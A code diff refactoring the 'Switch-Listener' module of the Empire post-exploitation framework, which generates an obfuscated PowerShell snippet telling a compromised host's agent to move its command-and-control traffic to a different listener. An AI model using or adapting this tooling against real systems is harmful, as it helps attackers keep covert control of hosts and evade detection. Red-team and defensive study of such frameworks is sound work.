@@ -1,87 +1,33 @@
 from __future__ import print_function
 
+from builtins import str
 from builtins import object
-
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Switch-Listener',
-
-            'Author': ['@harmj0y'],
-
-            'Description': ('Overwrites the listener controller logic with the agent with the '
-                            'logic from generate_comms() for the specified listener.'),
-
-            'Software': '',
-
-            'Techniques': ['T1008'],
-
-            'Background' : False,
-
-            'OutputExtension' : None,
-
-            'NeedsAdmin' : False,
-
-            'OpsecSafe' : True,
-
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-
-            'Comments': []
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to switch agent comms to.',
-                'Required'      :   True,
-                'Value'         :   ''
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # extract all of our options
-        listenerName = self.options['Listener']['Value']
+        listener_name = params['Listener']
 
-        if listenerName not in self.mainMenu.listeners.activeListeners:
-            print(helpers.color("[!] Listener '%s' doesn't exist!" % (listenerName)))
+        if listener_name not in main_menu.listeners.activeListeners:
+            print(helpers.color("[!] Listener '%s' doesn't exist!" % (listener_name)))
             return ''
 
-        activeListener = self.mainMenu.listeners.activeListeners[listenerName]
-        listenerOptions = activeListener['options']
+        active_listener = main_menu.listeners.activeListeners[listener_name]
+        listener_options = active_listener['options']
 
-        script = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_comms(listenerOptions=listenerOptions, language='powershell')
+        script = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_comms(listenerOptions=listener_options, language='powershell')
 
         # signal the existing listener that we're switching listeners, and the new comms code
-        script = "Send-Message -Packets $(Encode-Packet -Type 130 -Data '%s');\n%s" % (listenerName, script)
+        script = "Send-Message -Packets $(Encode-Packet -Type 130 -Data '%s');\n%s" % (listener_name, script)
 
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
         script = helpers.keyword_obfuscation(script)
 
         return script
